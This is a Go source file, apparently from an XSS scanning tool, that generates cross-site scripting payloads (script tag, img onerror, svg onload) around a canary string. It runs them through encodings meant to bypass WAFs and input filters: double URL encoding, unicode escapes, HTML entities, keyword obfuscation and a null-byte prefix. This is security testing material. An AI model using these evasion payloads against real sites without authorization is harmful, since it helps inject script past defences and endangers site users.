package xssengine

import (
	"fmt"
	"net/url"
	"strings"
)

// ============================================================
//  ENCODING BYPASS ENGINE — Multi-layer encoding transforms
//  Double URL · Unicode · HTML Entity · Mixed · Null Byte
// ============================================================

// EncodePayload applies various encoding transformations to a payload
// to bypass WAF/filter mechanisms.
func EncodePayload(payload string) []string {
	var results []string

	// Original
	results = append(results, payload)

	// Double URL encoding
	results = append(results, DoubleURLEncode(payload))

	// Unicode escape sequences
	results = append(results, UnicodeEscape(payload))

	// HTML entity encoding (decimal)
	results = append(results, HTMLEntityEncode(payload))

	// HTML entity encoding (hex)
	results = append(results, HTMLEntityHexEncode(payload))

	// Mixed encoding (partial encode)
	results = append(results, MixedEncode(payload))

	// Null byte prefix
	results = append(results, "%00"+payload)

	return results
}

// DoubleURLEncode applies URL encoding twice.
func DoubleURLEncode(s string) string {
	first := url.QueryEscape(s)
	return url.QueryEscape(first)
}

// UnicodeEscape converts critical characters to unicode escape sequences.
func UnicodeEscape(s string) string {
	var sb strings.Builder
	for _, r := range s {
		switch r {
		case '<':
			sb.WriteString(`\u003c`)
		case '>':
			sb.WriteString(`\u003e`)
		case '"':
			sb.WriteString(`\u0022`)
		case '\'':
			sb.WriteString(`\u0027`)
		case '(':
			sb.WriteString(`\u0028`)
		case ')':
			sb.WriteString(`\u0029`)
		case '/':
			sb.WriteString(`\u002f`)
		default:
			sb.WriteRune(r)
		}
	}
	return sb.String()
}

// HTMLEntityEncode converts critical characters to HTML decimal entities.
func HTMLEntityEncode(s string) string {
	var sb strings.Builder
	for _, r := range s {
		switch r {
		case '<':
			sb.WriteString("&#60;")
		case '>':
			sb.WriteString("&#62;")
		case '"':
			sb.WriteString("&#34;")
		case '\'':
			sb.WriteString("&#39;")
		case '(':
			sb.WriteString("&#40;")
		case ')':
			sb.WriteString("&#41;")
		default:
			sb.WriteRune(r)
		}
	}
	return sb.String()
}

// HTMLEntityHexEncode converts critical characters to HTML hex entities.
func HTMLEntityHexEncode(s string) string {
	var sb strings.Builder
	for _, r := range s {
		switch r {
		case '<':
			sb.WriteString("&#x3c;")
		case '>':
			sb.WriteString("&#x3e;")
		case '"':
			sb.WriteString("&#x22;")
		case '\'':
			sb.WriteString("&#x27;")
		case '(':
			sb.WriteString("&#x28;")
		case ')':
			sb.WriteString("&#x29;")
		default:
			sb.WriteRune(r)
		}
	}
	return sb.String()
}

// MixedEncode partially encodes the payload — only the tag delimiters
// to slip through basic filters.
func MixedEncode(s string) string {
	r := strings.NewReplacer(
		"<", "%3C",
		">", "%3E",
		"script", "scr%69pt",
		"alert", "al%65rt",
		"onerror", "on%65rror",
		"onload", "on%6Coad",
	)
	return r.Replace(s)
}

// GenerateEncodedPayloads takes a canary and generates encoding-bypassed payloads.
func GenerateEncodedPayloads(canary string) []string {
	basePayloads := []string{
		fmt.Sprintf(`<script>alert('%s')</script>`, canary),
		fmt.Sprintf(`"><img src=x onerror=alert('%s')>`, canary),
		fmt.Sprintf(`"><svg onload=alert('%s')>`, canary),
	}

	var allEncoded []string
	for _, p := range basePayloads {
		allEncoded = append(allEncoded, EncodePayload(p)...)
	}
	return allEncoded
}
